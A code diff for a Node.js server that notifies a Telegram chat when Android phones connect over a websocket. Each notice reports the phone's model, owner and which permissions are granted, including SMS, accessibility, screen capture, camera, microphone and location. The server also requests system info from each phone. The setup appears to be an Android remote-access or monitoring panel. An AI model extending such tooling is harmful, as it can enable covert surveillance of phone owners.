@@ -27,15 +27,68 @@ const TG_TOKEN = process.env.TG_BOT_TOKEN || '';
 const TG_CHAT  = process.env.TG_CHAT_ID   || '';
 const GH_TOKEN_SERVER = process.env.GH_TOKEN || '';
 
-async function tgSend(text) {
-  if (!TG_TOKEN || !TG_CHAT) return;
+async function tgSendMsg(text, replyMarkup) {
+  if (!TG_TOKEN || !TG_CHAT) return null;
   try {
-    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+    const body = { chat_id: TG_CHAT, text, parse_mode: 'HTML' };
+    if (replyMarkup) body.reply_markup = replyMarkup;
+    const r = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
       method: 'POST', headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' }),
+      body: JSON.stringify(body),
     });
-  } catch (_) {}
+    const d = await r.json();
+    return d.result?.message_id || null;
+  } catch { return null; }
 }
+
+async function tgEditMsg(messageId, text, replyMarkup) {
+  if (!TG_TOKEN || !TG_CHAT || !messageId) return;
+  try {
+    const body = { chat_id: TG_CHAT, message_id: messageId, text, parse_mode: 'HTML' };
+    if (replyMarkup) body.reply_markup = replyMarkup;
+    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/editMessageText`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(body),
+    });
+  } catch {}
+}
+
+async function tgAnswerCb(callbackQueryId, text) {
+  if (!TG_TOKEN) return;
+  try {
+    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/answerCallbackQuery`, {
+      method: 'POST', headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ callback_query_id: callbackQueryId, text: text || '' }),
+    });
+  } catch {}
+}
+
+const _PERM_LABELS = {
+  camera: '📷 Камера', mic: '🎙 Микрофон', phone: '📱 Телефон',
+  contacts: '👤 Контакты', sms: '💬 СМС', accessibility: '♿ Спец. возможности',
+  projection: '🖥 Экран', notifications: '🔔 Уведомления', btConnect: '🔵 Bluetooth',
+  location: '📍 Геолокация', mediaImages: '🖼 Фото', mediaVideo: '🎬 Видео',
+  calendar: '📅 Календарь',
+};
+
+function _formatPhoneTgText(model, owner, perms, online) {
+  const icon = online !== false ? '📱' : '📵';
+  const status = online !== false ? 'Телефон подключился' : 'Телефон оффлайн';
+  let text = `${icon} ${status}\nМодель: <b>${model || 'Android'}</b>`;
+  if (owner) text += `\nВладелец: <b>${owner}</b>`;
+  if (perms) {
+    const granted = Object.entries(perms).filter(([, v]) => v).map(([k]) => _PERM_LABELS[k] || k);
+    const denied  = Object.entries(perms).filter(([, v]) => !v).map(([k]) => _PERM_LABELS[k] || k);
+    if (granted.length) text += `\n\n✅ Выдано:\n  ${granted.join('\n  ')}`;
+    if (denied.length)  text += `\n\n❌ Не выдано:\n  ${denied.join('\n  ')}`;
+  }
+  return text;
+}
+
+const _tgRefreshKb = (ip) => ({ inline_keyboard: [[{ text: '🔄 Обновить', callback_data: `refresh:${ip}` }]] });
+
+// ip → { messageId, model, owner }
+const _tgPhoneMessages = new Map();
 
 // Дедупликация: не слать уведомление повторно если телефон переподключился < 2 мин назад
 const _tgPhoneNotified = new Map(); // ip → timestamp
@@ -43,10 +96,50 @@ function tgPhoneConnect(ip, model, owner) {
   const now = Date.now();
   if (now - (_tgPhoneNotified.get(ip) || 0) < 120_000) return;
   _tgPhoneNotified.set(ip, now);
-  let text = `📱 Телефон подключился\nМодель: <b>${model || 'Android'}</b>`;
-  if (owner) text += `\nВладелец: <b>${owner}</b>`;
-  tgSend(text);
+  const text = _formatPhoneTgText(model, owner, null, true);
+  tgSendMsg(text, _tgRefreshKb(ip)).then(msgId => {
+    if (msgId) _tgPhoneMessages.set(ip, { messageId: msgId, model: model || 'Android', owner: owner || '' });
+  });
 }
+
+// Telegram long polling — обработка нажатий на кнопку "Обновить"
+let _tgPollOffset = 0;
+async function _tgPollLoop() {
+  while (true) {
+    try {
+      const r = await fetch(
+        `https://api.telegram.org/bot${TG_TOKEN}/getUpdates?timeout=25&offset=${_tgPollOffset}&allowed_updates=%5B%22callback_query%22%5D`
+      );
+      if (!r.ok) { await new Promise(res => setTimeout(res, 5000)); continue; }
+      const data = await r.json();
+      for (const upd of data.result || []) {
+        _tgPollOffset = upd.update_id + 1;
+        const cq = upd.callback_query;
+        if (!cq) continue;
+        const cbData = cq.data || '';
+        if (cbData.startsWith('refresh:')) {
+          const ip = cbData.slice(8);
+          const state = _tgPhoneMessages.get(ip);
+          const phone = phoneCallPhones.get(ip);
+          const online = phone?.readyState === 1;
+          const reg = registry[ip] || {};
+          const model = reg.model || state?.model || 'Android';
+          const owner = reg.owner || state?.owner || '';
+          const perms = reg.perms || null;
+          const text = _formatPhoneTgText(model, owner, perms, online);
+          if (state) {
+            await tgEditMsg(state.messageId, text, _tgRefreshKb(ip));
+          } else {
+            const msgId = await tgSendMsg(text, _tgRefreshKb(ip));
+            if (msgId) _tgPhoneMessages.set(ip, { messageId: msgId, model, owner });
+          }
+          await tgAnswerCb(cq.id, online ? '✅ Обновлено' : '📵 Телефон оффлайн');
+        }
+      }
+    } catch { await new Promise(res => setTimeout(res, 5000)); }
+  }
+}
+if (TG_TOKEN) _tgPollLoop().catch(() => {});
 
 const app = express();
 app.use(express.json());
@@ -1045,6 +1138,7 @@ wssPhone.on('connection', (ws, req) => {
     tgPhoneConnect(ip, model, owner);
     phoneCallPhones.set(ip, ws);
     regTouch(ip, { online: true, lastSeen: Date.now(), deleted: false });
+    ws.send(JSON.stringify({ cmd: 'get-system-info' }));
     for (const v of phoneCallViewers) {
       if (v.readyState !== v.OPEN) continue;
       if (!_canViewPhone(v._username, ip)) continue;
@@ -1124,6 +1218,15 @@ wssPhone.on('connection', (ws, req) => {
             }
           }
           regTouch(regIp, upd);
+        }
+        if (m.type === 'system-info' && m.perms) {
+          regTouch(ip, { perms: m.perms });
+          const state = _tgPhoneMessages.get(ip);
+          if (state) {
+            const reg = registry[ip] || {};
+            const text = _formatPhoneTgText(state.model || reg.model, state.owner || reg.owner, m.perms, true);
+            tgEditMsg(state.messageId, text, _tgRefreshKb(ip));
+          }
         }
       } catch {}
       for (const v of phoneCallViewers) {
